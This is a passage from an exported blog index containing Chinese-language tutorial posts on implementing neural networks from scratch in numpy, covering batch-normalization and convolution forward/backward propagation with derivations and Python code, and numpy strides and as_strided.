x_i}\\\\&=\\frac{\\delta_{\\hat{x}_i}}{\\sigma}-\\frac{1}{n\\sigma}\\sum_{j=1}^n\\delta_{\\hat{x}_j}-\\frac{x_i-\\mu}{n\\sigma^3}\\sum_{j=1}^n\\delta_{\\hat{x}_j}(x_j-\\mu)\\\\&=\\frac{1}{n\\sigma}(n\\delta_{\\hat{x}_i}-\\sum_{j=1}^n\\delta_{\\hat{x}_j}-\\frac{x_i-\\mu}{\\sigma}\\sum_{j=1}^n\\delta_{\\hat{x}_j}\\frac{x_j-\\mu}{\\sigma})\\\\&=\\frac{1}{n\\sigma}(n\\delta_{\\hat{x}_i}-\\sum_{j=1}^n\\delta_{\\hat{x}_j}-\\hat{x}_i\\sum_{j=1}^n\\delta_{\\hat{x}_j}\\hat{x}_j)\\end{aligned}$$\n\n\n\n\n---\n\n### 代码\n\n\n最后，给出BN层正反向传播的代码：\n\n\n正向传播\n\n\n\n```python\ndef forward(self, x: Tensor)\n    axis = (0, -1, -2)[:x.ndim - 1]\n    if self.training:\n        batch_mean = Tensor(np.mean(x.data, axis=axis, keepdims=True))\n        batch_var = Tensor(np.var(x.data, axis=axis, keepdims=True))\n        if self.track_running_stats:\n            self.running_mean = (1. - self.momentum) * self.running_mean + self.momentum * batch_mean\n            self.running_var = (1. - self.momentum) * self.running_var + self.momentum * batch_var\n        return F.batch_norm(x, batch_mean, batch_var, self.gamma, self.beta, self.eps)\n    if self.track_running_stats:\n        return F.batch_norm(x, self.running_mean, self.running_var, self.gamma, self.beta, self.eps)\n    batch_mean = Tensor(np.mean(x.data, axis=axis, keepdims=True))\n    batch_var = Tensor(np.var(x.data, axis=axis, keepdims=True))\n    return F.batch_norm(x, batch_mean, batch_var, self.gamma, self.beta, self.eps)\n```\n\n首先，根据输入数据x的维数（3或4），确定计算均值和方差时用到的axis（相当于去掉了Channel所在的1轴），接下来的操作分为training阶段或eval阶段，具体过程前面已经讲过了，这里省略一千字，直接来到最后调用的`batch_norm`函数。\n\n\n\n```python\ndef batch_norm(x: Tensor, mean: Tensor, var: Tensor, gamma: Tensor, beta: Tensor, eps=1e-5):\n    axis = (0, -1, -2)[:x.ndim - 1]\n    x_hat = (x.data - mean.data) / np.sqrt(var.data + eps)\n    output = Tensor(np.expand_dims(gamma.data, axis) * x_hat + np.expand_dims(beta.data, axis), requires_grad=x.requires_grad or gamma.requires_grad or beta.requires_grad)\n    if output.grad_enable:\n        output.grad_fn = BatchNormBackward()\n        output.children = [(x, x_hat, mean.data, var.data, eps), (gamma, None), (beta, None)]\n    return output\n```\n\n`batch_norm`函数也没啥好讲的，就是老老实实按前面的公式进行计算得到$y$即可，唯一需要注意的是gamma、beta在这里没办法直接broadcast（它俩的形状都是`(C,)`，而x_hat的形状则是`(B, C, H, W)`或`(B, C, L)`，因此需要手动扩展维度再进行affine运算）。\n\n\n在计算图的children中，也额外放了一些信息，分别对应前面公式里的$\\hat{x},\\mu,\\sigma^2$，以便于梯度的计算。\n\n\n接下来是反向传播代码：\n\n\n\n```python\nclass BatchNormBackward(BackwardFcn):\n    def calculate_grad(self, grad, children, place):\n        x, x_hat, mean, var, eps = children[0]\n        axis = (0, -1, -2)[:x.ndim - 1]\n        gamma = children[1][0]\n        grad_x_hat = grad * np.expand_dims(gamma.data, axis)\n        if place == 0:\n            n = grad.size / grad.shape[1]\n            dx = n * grad_x_hat - np.sum(grad_x_hat, axis=axis, keepdims=True) - \\\n                x_hat * np.sum(x_hat * grad_x_hat, axis=axis, keepdims=True)\n            dx = dx / (n * np.sqrt(var + eps))\n            return dx\n        elif place == 1:\n            return np.sum(x_hat * grad, axis=axis)\n        else:\n            return np.sum(grad, axis=axis)\n```\n\n由于梯度的公式已经明明白白地写在了前面，这里的反向传播代码基本没啥可说的了，只要注意一下不要搞错维度就行。\n\n\n可能有朋友会问，我们不是已经实现了这些基本运算的梯度传播了嘛，为什么还要大费周章地进行人力求导呢？这是因为我们计算了梯度之后发现，x的梯度可以利用很多已经得到的信息（如x_hat）进行快速计算，把这个计算图的反向传播过程打包成一个BatchNormBackward，在运算效率上有一定的提升，这样的例子还有不少，例如我前面已经提过一次的交叉熵损失函数。\n\n\n\n\n---\n\n本文虽然不算硬核，但涉及到的数学公式推导相对于前面的卷积更复杂些，希望诸位能自己在纸上从头至尾推导一遍，这块内容只要能把公式推出来，代码只是水到渠成。\n\n\n如果对池化的反向传播有更好的建议，麻烦告诉我！\n\n\n至此，计算图、反向传播部分已经实现的差不多了（其实反向传播还有一堆没写hhh，但不重要，这些只是时间问题罢了），后面的文章将完善模型的优化部分，最后将尝试通过自己写的神经网络来训练一个简单的模型。\n","tags":["Python","神经网络","反向传播","卷积神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——卷积运算的反向传播（二）","url":"//blog/6099/","content":"\n[前一篇文章](/blog/6034/)中我们简单推导了卷积运算的梯度传播公式，本文将通过代码实现卷积反向传播的过程。本文代码主要位于nn/conv_operations.py文件，反向传播代码位于autograd/backward.py文件。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n首先揭秘前面提到的dilate操作，在卷积步长$S>1$时，我们在对卷积核$W$计算梯度$\\delta_W$时，需要将$\\delta_Z$进行所谓的dilate操作，下图为$S=2$时，需要进行的dilate操作示意图。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/140a1fcbb3d95bc5b0c5a6189464e948.png)\n事实上，dilate操作就是在相邻的行（列）之间插入一定行（列）数的0，通过推导可以知道，每两行（列）之间插入0的行（列）数＝$S-1$。\n\n\n另外，我们在反向传播的时候需要讨论一些额外的情况：数据的padding操作以及卷积核的dilate操作。相信用过PyTorch的朋友都知道，PyTorch在卷积时，有一个padding参数和一个dilation参数，padding一般来说是为了维持卷积前后数据的分辨率尺寸（长宽）不变，dilation则是作用在卷积核上，是为了在参数量保持不变的情况下，增大卷积核的感受野。在做反向传播的时候，我们也要将padding和dilation这两种变换考虑进去（对于padding，简单起见我们只考虑pad 0的情况），在使用了这两个变换的情况下，要用经变换后的数据、卷积核来进行梯度的计算，在得到计算结果后，再根据之前所做的变换，反变换回去。\n\n\n\n\n---\n\n## 几个基本函数\n\n\n首先我们写几个经常会用到的函数，分别是padding、dilate以及它们的逆操作。\n\n\npadding_zeros/unwrap_padding\n\n\n\n```python\ndef padding_zeros(x: np.ndarray, padding):\n    \"\"\"\n    在张量周围填补0\n    @param x: 需要被padding的张量,ndarray类型\n    @param padding: 一个二元组,其每个元素也是一个二元组,分别表示竖直、水平方向需要padding的层数\n    @return: padding的结果\n    \"\"\"\n    if padding == ((0, 0), (0, 0)):\n        return x\n    n = x.ndim - 2\n    x = np.pad(x, ((0, 0),) * n + padding, 'constant', constant_values=0)\n    return x\n\n\ndef unwrap_padding(x: np.ndarray, padding):\n    \"\"\"\n    padding的逆操作\n    @param x:\n    @param padding:\n    @return:\n    \"\"\"\n    if padding == ((0, 0), (0, 0)):\n        return x\n    p, q = padding\n    if p == (0, 0):\n        return x[..., :, q[0]:-q[1]]\n    if q == (0, 0):\n        return x[..., p[0]:-p[1], :]\n    return x[..., p[0]:-p[1], q[0]:-q[1]]\n```\n\ndilate/erode\n\n\n\n```python\ndef dilate(x: np.ndarray, dilation=(0, 0)):\n    \"\"\"\n    膨胀,在各行、列间插入一定数量的0\n    \"\"\"\n    if dilation == (0, 0):\n        return x\n    *bc, h, w = x.shape\n    y = np.zeros((*bc, (h - 1) * (dilation[0] + 1) + 1, (w - 1) * (dilation[1] + 1) + 1), dtype=np.float32)\n    y[..., ::dilation[0] + 1, ::dilation[1] + 1] = x\n    return y\n\n\ndef erode(x: np.ndarray, dilation=(0, 0)):\n    \"\"\"\n    腐蚀,与膨胀互为逆运算\n    \"\"\"\n    if dilation == (0, 0):\n        return x\n    y = x[..., ::dilation[0] + 1, ::dilation[1] + 1]\n    return y\n```\n\n上面的代码相对比较容易理解，而且并非本文重点，故不再解释。需要注意的是，所有上面的运算，都只作用在数据的分辨率维度上（长宽所在维度）。\n\n\n另外，我们还需要一个运算，即前面文章提到过的rotate180操作：\n\n\n\n```python\ndef rotate180(kernel: np.ndarray, axis=(-1, -2)):\n    return np.flip(kernel, axis)\n```\n\n我使用了`np.flip`函数来完成这个操作。\n\n\n\n\n---\n\n## 卷积的正向传播\n\n\n接下来就到了卷积反向传播的硬核内容了，首先我们给出正向传播代码：\n\n\n\n```python\ndef conv2d(x: Tensor, weight: Tensor, bias: Tensor = None, stride=(1, 1), padding=(0, 0), dilation=(0, 0)):\n    assert x.ndim == 4, 'x must be 4 dimensional'\n    b, c, h, w = x.shape\n    oc, ic, kh, kw = weight.shape\n    assert c == ic, 'Conv2d channels not equal'\n    stride = _pair(stride)\n    padding = _pair(padding)\n    dilation = _pair(dilation)\n    padding = ((padding[0], padding[0]), (padding[1], padding[1]))\n    padded_data = padding_zeros(x.data, padding)\n    dilated_weight = dilate(weight.data, dilation)\n    split = split_by_strides(padded_data, dilated_weight.shape[-2:], stride=stride)\n    output = Tensor(np.tensordot(split, dilated_weight, axes=[(1, 4, 5), (1, 2, 3)]).transpose((0, 3, 1, 2)),\n                    requires_grad=x.requires_grad)\n    if bias is not None:\n        output = output + bias[:, None, None]\n    if output.grad_enable:\n        output.children = [(x, padded_data, padding), (weight, dilated_weight, stride, dilation)]\n        if bias is not None:\n            output.children.append((bias, None))\n        output.grad_fn = Conv2dBackward()\n    return output\n```\n\n前面未曾讨论卷积正向传播中的bias，但个人认为它比较容易处理，就是一个带广播的加法操作罢了。上面的代码，核心部分是从`padded_data = padding_zeros(x.data, padding)`开始的，下面给出核心代码的解释：\n\n\n- `padded_data = padding_zeros(x.data, padding)`，对数据进行padding操作。\n- `dilated_weight = dilate(weight.data, dilation)`，对卷积核进行dilate操作。\n- `split = split_by_strides(padded_data, dilated_weight.shape[-2:], stride=stride)`，熟悉的`split_by_strides`，将数据进行分割。\n- `output = Tensor(np.tensordot(split, dilated_weight, axes=[(1, 4, 5), (1, 2, 3)]).transpose((0, 3, 1, 2)), requires_grad=x.requires_grad)`，得到卷积结果，封装成计算图节点数据类型Tensor。\n\n在得到卷积结果后，我们再处理bias的部分：\n\n\n\n```python\nif bias is not None:\n    output = output + bias[:, None, None]\n```\n\n最后再指定children和grad_fn：\n\n\n\n```python\nif output.grad_enable:\n    output.children = [(x, padded_data, padding), (weight, dilated_weight, stride, dilation)]\n    if bias is not None:\n        output.children.append((bias, None))\n    output.grad_fn = Conv2dBackward()\n```\n\n在children中，我们记录的信息比较多且杂，其中与x放在一起的有经过padding之后的数据padded_data和padding参数值，与weight放在一起的有经过膨胀操作的卷积核dilated_weight，卷积的步长stride，以及膨胀尺寸dilation。放这么多内容的原因除了提供必要的参数外，还有为了在反向传播时尽量避免重复操作。\n\n\n## 卷积的反向传播\n\n\n下面我们给出反向传播代码：\n\n\n\n```python\nclass Conv2dBackward(BackwardFcn):\n    def calculate_grad(self, grad, children, place):\n        x, padding = children[0][1:]\n        if place == 0:\n            dilated_weight, stride = children[1][1: 3]\n            grad = dilate(grad, (stride[0] - 1, stride[1] - 1))\n            delta_x_shape = x.shape[-2] + sum(padding[0]), x.shape[-1] + sum(padding[1])\n            add_rows, add_cols = np.array(delta_x_shape) + dilated_weight.shape[-2:] - 1 - np.array(grad.shape[-2:])\n            padding_x = np.floor(add_rows / 2).astype(int), np.ceil(add_rows / 2).astype(int)\n            padding_y = np.floor(add_cols / 2).astype(int), np.ceil(add_cols / 2).astype(int)\n            grad = padding_zeros(grad, (padding_x, padding_y))\n            return unwrap_padding(reverse_conv2d(grad, dilated_weight, rotate=True, invert=False), padding)\n        elif place == 1:\n            x = padding_zeros(x.data, padding)\n            stride, dilation = children[1][2:]\n            grad = dilate(grad, (stride[0] - 1, stride[1] - 1))\n            return erode(reverse_conv2d(x, grad, rotate=False, invert=True), dilation)\n        else:\n            return np.sum(grad, (0, -1, -2))\n```\n\n我们将其分成三个部分来分别解读，三个部分分别计算了$\\delta_X$，$\\delta_W$和$\\delta_B$（bias的梯度）。\n\n\n\n\n---\n\n$\\delta_X=pad(dilate(\\delta_Z)) \\ast rotate180(W)$\n\n\n\n```python\ndilated_weight, stride = children[1][1: 3]\ngrad = dilate(grad, (stride[0] - 1, stride[1] - 1))\ndelta_x_shape = x.shape[-2:]\nadd_rows, add_cols = np.array(delta_x_shape) + dilated_weight.shape[-2:] - 1 - np.array(grad.shape[-2:])\npadding_x = np.floor(add_rows / 2).astype(int), np.ceil(add_rows / 2).astype(int)\npadding_y = np.floor(add_cols / 2).astype(int), np.ceil(add_cols / 2).astype(int)\ngrad = padding_zeros(grad, (padding_x, padding_y))\nreturn unwrap_padding(reverse_conv2d(grad, dilated_weight, rotate=True, invert=False), padding)\n```\n\n代码中的grad相当于公式中的$\\delta_Z$，首先根据公式，我们将grad进行dilate和padding操作，dilate插入0的行列数是步长减去1，而padding增加的行列数：padding_x、padding_y，则是我通过形状反向算出来的，只是一点简单的形状推导，希望你也会，如果你懒得推，我在后面给了一个例子。\n\n\n最后我们带着变换后的$\\delta_Z$和卷积核，进入一个被我称为`reverse_conv2d`（反向卷积）的函数，其实这个函数就是做了一个普通的卷积运算，只是额外加了一些操作，例如卷积核的rotate180。注意，如果在卷积过程中给了卷积核膨胀参数，那么最后传入的卷积核，是经过膨胀后的卷积核，这是因为我们这里计算的是对数据矩阵$X$的梯度。\n\n\n下面给出`reverse_conv2d`函数：\n\n\n\n```python\ndef reverse_conv2d(x: np.ndarray, kernel: np.ndarray, rotate=False, invert=False):\n    \"\"\"\n    conv2d的反向卷积,求梯度时用的\n    @param x: 被卷积的张量\n    @param kernel: 卷积核\n    @param rotate: 卷积核旋转180度\n    @param invert: 该参数有点迷,不好解释,简单的说就是反向卷积有两种,视卷积结果的形状需要调整一些轴的位置\n    @return: 反向卷积结果\n    \"\"\"\n    ksize = kernel.shape\n    x = split_by_strides(x, ksize[-2:])\n    if rotate:\n        kernel = rotate180(kernel)\n    i = 0 if invert else 1\n    y = np.tensordot(x, kernel, [(i, 4, 5), (0, 2, 3)])\n    if invert:\n        return y.transpose((3, 0, 1, 2))\n    return y.transpose((0, 3, 1, 2))\n```\n\n注意到，这其实就是一个普通的卷积运算，区别在于，首先我们判断了是否要对卷积核进行rotate180操作，另有一个相对比较难理解的参数——invert，这个参数说白了其实是用来调整轴的位置的，下面我们根据一个实际的例子，来形象地说明为什么需要这个参数。\n\n\n考虑下面一个步长为1、数据不进行padding、卷积核不做dilate的卷积：$X \\ast W = Z$\n\n\n$(8, 3, 4, 4) \\ast (6, 3, 2, 2) = (8, 6, 3, 3)$\n\n\n我们计算$\\delta_X$，根据公式，我们需要将$\\delta_Z$进行padding、dilate后与rotate后的卷积核进行卷积。我们首先知道，grad($\\delta_Z$)的形状应该是(8, 6, 3, 3)，卷积核的形状是(6, 3, 2, 2)，它俩卷积要得到(8, 3, 4, 4)的形状（即$\\delta_X$的形状），那么需要把(8, 6, 3, 3)增大到(8, 6, 5, 5)，也就是padding一圈，因此，进入`reverse_conv2d`函数的grad，形状为(8, 6, 5, 5)，dilated_weight形状为(6, 3, 2, 2)，在`reverse_conv2d`函数中，通过`split_by_strides`得到的x的形状自然是(8, 6, 4, 4, 2, 2)，与前面的卷积类似，它将与dilated_weight进行`tensordot`运算，我们可以直接根据形状，来判断需要指定哪些轴作为求和轴，两者的形状分别是(8, 6, 4, 4, 2, 2)与(6, 3, 2, 2)，那么这种情况下，求和轴应该是[(1, 4, 5), (0, 2, 3)]，在代码中对应的即是invert参数为False的情况。`tensordot`得到的张量形状为(8, 4, 4, 3)，而我们期望得到的形状是(8, 3, 4, 4)，因此我们再做一个transpose((0, 3, 1, 2))的操作，将原来的3轴换到1轴的位置上。基于类似的考虑，可以发现在计算grad($\\delta_W$)时，需要将invert参数置为True。\n\n\n还记得前面卷积正向传播的时候，指定的求和轴是哪些吗——[(1, 4, 5), (1, 2, 3)]，而这里是[(1, 4, 5), (0, 2, 3)]，为什么卷积核的求和轴，从(1, 2, 3)变成了(0, 2, 3)？除了从形状必须一一对应这个角度解释外，从另一个角度，因为这里是计算对$X$的梯度，在卷积运算时，每一个卷积核都会分别与$X$进行作用，因此在反向传播梯度的时候，每一个卷积核都会拥有与$X$的梯度相关的部分，在最后就需要对它们进行求和，这也是求和轴包含了卷积核的Out_Channels维度的原因。\n\n\n我们继续回到反向传播的最后一句代码：\n\n\n\n```python\nreturn unwrap_padding(reverse_conv2d(grad, dilated_weight, rotate=True, invert=False), padding)\n```\n\n从`reverse_conv2d`函数出来后，我们需要将结果反padding一下，原因是我们计算得到的结果，实际上是对padding后的$X$的梯度，因此真正的$\\delta_X$，还需要把结果去掉周围的padding。\n\n\n\n\n---\n\n$\\delta_W=X \\ast dilate(\\delta_Z)$\n\n\n\n```python\nx = padding_zeros(x.data, padding)\nstride, dilation = children[1][2:]\ngrad = dilate(grad, (stride[0] - 1, stride[1] - 1))\nreturn erode(reverse_conv2d(x, grad, rotate=False, invert=True), dilation)\n```\n\n这段代码用以计算对卷积核的梯度$\\delta_W$，在实际运用公式时，如果正向卷积使用了padding，那么公式中的$X$也是经过padding后的$X$。\n\n\n所以第一步我们把x进行padding，接下来同样地，我们根据公式，把grad（$\\delta_Z$）进行dilate，并塞入`reverse_conv2d`函数，这个公式里，我们不需要把卷积核rotate180，因此指定rotate参数为False，另一个参数invert，这里指定为True。这一次，我希望你可以通过自己的研究，判断一下在这种情况下，`tensordot`求和轴是哪些以及最后的`transpose`应该如何换轴。\n\n\n最后，如果在卷积正向传播中，卷积核经过了dilate，那么我们求出来的卷积核梯度，其实也是dilate以后的梯度，故我们在最后需要erode一下，把它还原回去。\n\n\n\n\n---\n\n$\\delta_B$\n\n\n\n```python\nreturn np.sum(grad, (0, -1, -2))\n```\n\n计算bias的梯度$\\delta_B$，只有一句代码，十分简单，建议各位自己在纸上推导一下，看看为什么是这样算的。\n\n\n\n\n---\n\n本文将卷积运算的反向传播过程通过代码进行了实现，将卷积的反向传播过程从公式转化为代码有一点困难（至少对我而言），希望各位可以仔细研究，写出自己的卷积反向传播代码。\n\n\n完成了二维卷积后，对于一维卷积（序列卷积），我们只需将其扩展为H=1、对应步长为1的二维卷积情形：\n\n\n\n```python\ndef conv1d(x: Tensor, weight: Tensor, bias: Tensor = None, stride=1, padding=0, dilation=0):\n    assert x.ndim == 3, 'x must be 3 dimensional'\n    return conv2d(x.unsqueeze(-2), weight.unsqueeze(-2), bias, (1, stride), (0, padding), (0, dilation)).squeeze(-2)\n```\n\n由于上面用到的所有运算我们都已经定义好了反向传播，所以一维卷积的反向传播自然能够顺利完成。\n\n\n本系列最硬核的部分已经结束，若有无法理解的地方，欢迎与我讨论。后面的文章里，将介绍一下两种池化层、BN层以及优化器的实现方法，会十分容易。\n","tags":["Python","神经网络","反向传播","卷积神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——卷积运算的反向传播（一）","url":"//blog/6034/","content":"\n前面写了整整三篇文章讨论了卷积运算的正向传播，本文将进入卷积运算的反向传播部分，将涉及到一些简单的数学公式推导（与其说是推导，不如说是瞪眼法+直接写结论），都是最简单的线性函数，不必裂开。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n我们以下面简单的卷积过程为例，推导卷积运算的梯度传播式：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d596c36340bdad3255c826f208084e58.png)\n我们将上面的卷积过程展开写出来，得到下面4个方程：\n\n\n$$\\left\\lbrace\\begin{aligned}z_{00}=x_{00}w_{00}+x_{01}w_{01}+x_{10}w_{10}+x_{11}w_{11}\\\\z_{01}=x_{01}w_{00}+x_{02}w_{01}+x_{11}w_{10}+x_{12}w_{11}\\\\z_{10}=x_{10}w_{00}+x_{11}w_{01}+x_{20}w_{10}+x_{21}w_{11}\\\\z_{11}=x_{11}w_{00}+x_{12}w_{01}+x_{21}w_{10}+x_{22}w_{11}\\end{aligned}\\right.$$\n\n\n已知传至张量$Z$的梯度为$\\delta_Z$，我们分别对数据张量$X$和卷积核张量$W$计算梯度。\n\n\n## 对X的梯度\n\n\n下面先计算对$X$的梯度$\\delta_X$，通过简单的链式法则即可得到：\n\n\n$$\\left\\lbrace\\begin{aligned}&\\delta_{x_{00}}=w_{00}\\delta_{z_{00}}\\\\&\\delta_{x_{01}}=w_{01}\\delta_{z_{00}}+w_{00}\\delta_{z_{01}}\\\\&\\delta_{x_{02}}=w_{01}\\delta_{z_{01}}\\\\&\\delta_{x_{10}}=w_{10}\\delta_{z_{00}}+w_{00}\\delta_{z_{10}}\\\\&\\delta_{x_{11}}=w_{11}\\delta_{z_{00}}+w_{10}\\delta{z_{01}}+w_{01}\\delta{z_{10}}+w_{00}\\delta_{z_{11}}\\\\&\\delta_{x_{12}}=w_{11}\\delta_{z_{01}}+w_{01}\\delta_{z_{11}}\\\\&\\delta_{x_{20}}=w_{10}\\delta_{z_{10}}\\\\&\\delta_{x_{21}}=w_{11}\\delta_{z_{10}}+w_{10}\\delta_{z_{11}}\\\\&\\delta_{x_{22}}=w_{11}\\delta_{z_{11}}\\end{aligned}\\right.$$\n\n\n乍一看十分复杂，但事实上，通过瞪眼法我们可得出，这是以下卷积过程的展开式：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/a0f09f3badbef3d8c2b847713653f438.png)\n其中，左侧是$Z$的梯度矩阵$\\delta_Z$经过一圈padding之后的样子，中间的卷积核是原来的卷积核$W$，经过180度的旋转所得到的，回顾前一篇文章所讲到的，这种旋转相当于张量所有元素在内存上的顺序reverse了一下。\n\n\n需要注意的是，若正向卷积时的步长大于1，那么在这里计算梯度$\\delta_X$的时候，需要对梯度$\\delta_Z$额外进行一次插入0的操作，我将这种操作称为dilate，各位可以自己去推导一下，看看究竟需要做什么操作。\n\n\n我们可以将上面的梯度表达式简写为：\n\n\n$$\\delta_X=pad(dilate(\\delta_Z)) \\ast rotate180(W)$$\n\n\n通过简单的推导，可以发现，pad的圈数，应该与正向卷积的步长是相关的，不过其实还有一个巧妙的算法，即通过这三者的形状进行反推，感兴趣的话可以去推导一下。\n\n\n\n\n---\n\n## 对W的梯度\n\n\n接下来计算对卷积核$W$的梯度$\\delta_W$，同样由前面的方程进行链式法则计算：\n\n\n$$\\left\\lbrace\\begin{aligned}&\\delta_{w_{00}}=x_{00}\\delta_{z_{00}}+x_{01}\\delta_{z_{01}}+x_{10}\\delta_{z_{10}}+x_{11}\\delta_{z_{11}}\\\\&\\delta_{w_{01}}=x_{01}\\delta_{z_{00}}+x_{02}\\delta_{z_{01}}+x_{11}\\delta_{z_{10}}+x_{12}\\delta_{z_{11}}\\\\&\\delta_{w_{10}}=x_{10}\\delta_{z_{00}}+x_{11}\\delta_{z_{01}}+x_{20}\\delta_{z_{10}}+x_{21}\\delta_{z_{11}}\\\\&\\delta_{w_{11}}=x_{11}\\delta_{z_{00}}+x_{12}\\delta_{z_{01}}+x_{21}\\delta_{z_{10}}+x_{22}\\delta_{z_{11}}\\end{aligned}\\right.$$\n\n\n这一组公式的规律更加明显了，其相当于下面的卷积运算的展开式：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/6031d487185cac25085f2f91f94e463d.png)\n与前面计算$\\delta_X$时类似，若正向卷积时的步长大于1，那么在这里计算梯度$\\delta_W$的时候，同样需要对梯度$\\delta_Z$进行dilate操作，不过这里不需要pad 0。\n\n\n我们同样可以将上面的梯度表达式简写为：\n\n\n$$\\delta_W=X \\ast dilate(\\delta_Z)$$\n\n\n\n\n---\n\n以上，即是卷积运算的梯度传播公式，即便是高维情况下的卷积运算，也万变不离其宗。本文虽短，但思考为什么卷积的梯度传递会是这样的形式让我死了很多脑细胞。后面一篇文章，将进入卷积运算反向传播的代码实现部分！\n","tags":["神经网络","反向传播","卷积神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——卷积运算的正向传播（三）","url":"//blog/5977/","content":"\n[前文](/blog/5945/)介绍了一种卷积运算的骚操作——img2col，但仍不是十分满意，本文将介绍另一种卷积的骚操作——`as_strided`。\n\n用`as_strided`结合`tensordot`函数，实现的卷积运算甚至不需要在Python中做for循环，达到了极致的简洁美。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n**本文很长，希望你忍一下。**\n\n\n## 一些你需要了解的前置知识\n\n\n### Numpy数组在内存中的存储\n\n\n我们首先介绍numpy数组在内存里存储方式。\n\n\n众所周知，numpy中的数据类型都有其对应的内存占用，例如int64与float64都会占用8个byte的内存空间，bool类型占用1个byte等。具体请移步官方文档进行查看。\n\n\n除此以外，我们还需要知道numpy数组的元素在内存中的排列顺序。如果数组是一个向量：$[1, 2, 3, 4]$，那么自然是按从左到右的顺序连续存储在内存中；如果数组是一个矩阵：$$\\begin{bmatrix}1 & 2\\\\ 3&4 \\end{bmatrix}$$，这种情况下，数据会按从左到右、从上到下的顺序，连续存储在内存中，即存放顺序与向量$[1, 2, 3, 4]$是一样的；一般地，对于任意一个多维的数组，其中的数据在内存中的索引应该满足一个维度从外到内的遍历顺序，一个形状为`(a1, a2, ..., an)`的数组，在内存中的顺序相当于以下面的方式进行遍历的顺序：\n\n\n\n```python\nfor i_1 in range(a1):\n    for i_2 in range(a2):\n        ...\n            for i_n in range(an):\n                array[i_1, i_2, ... i_n]\n```\n\n值得一提的是，如果将一个数组进行`flatten`操作，得到的向量正是其元素在内存中的排列。\n\n\n\n\n---\n\n### Numpy数组的Strides属性\n\n\n接下来，就可以引入numpy数组的strides（跨度）概念，官方对其的定义如下：\n\n\n\n> Tuple of bytes to step in each dimension when traversing an array.\n\n\n大概意思就是，从数组上的某个位置出发，沿着某个坐标轴移动到下一个位置，必须跳过的内存中的字节数。下面以一个简单的例子来说明这个概念：\n\n\n考虑以下数据类型为int64的numpy数组：\n\n\n$$\\begin{bmatrix}1&2&3\\\\4&5&6 \\end{bmatrix}$$\n\n\n它的元素在内存中的顺序是：$[1, 2, 3, 4, 5, 6]$，共占用$6\\times 8 = 48$个byte。这个矩阵有两个坐标轴，分别是0轴和1轴（注意：该矩阵的形状为`(2, 3)`，它的0轴表示长度为2的轴，实际上是纵向的，而1轴则是横向的）。现在假设我们处于元素1的位置上，要想沿着0轴移动到下一个位置——4，在内存中需要跳过多少个byte呢？显而易见，1和4在内存中共隔了两个元素：2、3。1想要到达4，必须依次到达2、3、4，故1沿着0轴移动到下一个位置4需要跳过$3\\times 8 = 24$个byte。\n\n\n同理，从元素1的位置上沿着1轴到达下一个位置——2，只需要跳过8个byte，因为它们在内存上是相邻的。\n\n\n所以我们说，这个矩阵的strides属性为`(24, 8)`。\n\n\n在numpy中，我们不需要手动去计算strides属性，因为数组自身就带了这个attribute，直接调用即可。\n\n\n\n\n---\n\n### as_strided函数\n\n\n有了strides的概念，我们终于可以引入高效卷积运算的大杀器——`as_strided`函数，我们可以通过下面的方式导入它：\n\n\n\n```python\nfrom numpy.lib.stride_tricks import as_strided\n```\n\n真是深藏不露...\n\n\n我们来看其官方注释：\n\n\n\n```python\ndef as_strided(x, shape=None, strides=None, subok=False, writeable=True):\n    \"\"\"\n    Create a view into the array with the given shape and strides.\n\n    .. warning:: This function has to be used with extreme care, see notes.\n\n    Parameters\n    ----------\n    x : ndarray\n        Array to create a new.\n    shape : sequence of int, optional\n        The shape of the new array. Defaults to ``x.shape``.\n    strides : sequence of int, optional\n        The strides of the new array. Defaults to ``x.strides``.\n    subok : bool, optional\n        .. versionadded:: 1.10\n```\n\nwarning意味着你想调用这个函数一定要非常小心，因为它是直接操作内存的，稍有不慎就会出现一些溢出错误，而直接操作内存也是其效率极高的原因所在。\n\n\n首先开门见山地进行说明，这个函数的作用是通过在一个给定数组中取值，来生成一个新的数组，至于要如何取值，且看下文分解。\n\n\n这个函数需要提供的参数共有5个，然而我们一般只需要提供前3个参数就好了，下面对前3个参数进行解释。\n\n\n- x：给定的数组，函数将会在这个数组中进行取值，来生成结果。\n- shape：表示输出数组的形状，这个也容易理解，你要生成新数组总得知道它的形状吧。\n- strides：与前面的strides的意义略有不同，该参数描述了从给定数组x中取数的规则。其意义是，从**新数组**的某个位置出发，沿着**新数组**的某个坐标轴移动到下一个位置，需要跳过的给定**原数组**x所占用内存中的字节数。\n\n相信看了如上对strides参数的解释，你一定是一头雾水。下面还是以一个例子来解释：\n\n\n依然考虑数据类型为int64的矩阵：\n\n\n$$\\begin{bmatrix}1&2&3\\\\4&5&6 \\end{bmatrix}$$\n\n\n我们用它来生成另一个$2\\times 3$的矩阵，并且指定参数`strides=(16, 8)`，来手动操作一下这个过程。\n\n\n首先，新数组的第一个元素，对应的也是原数组的第一个元素，即为1。接下来，我们先沿着新数组的1轴走一步，看看这个位置上应该是多少。strides参数告诉我们，沿着**新数组**的1轴走一步，需要跨过**原数组**内存上的8个byte，而原数组元素在内存上的顺序是$[1, 2, 3, 4, 5, 6]$，从1的位置出发，跨越8个byte得到的数是2，因此，新数组的$[0, 1]$位置上的元素就是2。同理，从新数组的$[0, 1]$位置出发沿着1轴再走一步，也需要跨过原数组内存上的8个byte，因此我们得到新数组$[0, 2]$位置上的元素是3。\n\n\n现在再来看新数组的0轴方向，我们依然从新数组的$[0, 0]$位置出发，这回沿着0轴走一步，strides参数告诉我们，沿着**新数组**的0轴走一步，需要跨过**原数组**内存上的16个byte，而对原数组而言，元素1往后16个byte是元素3，因此，新数组$[1, 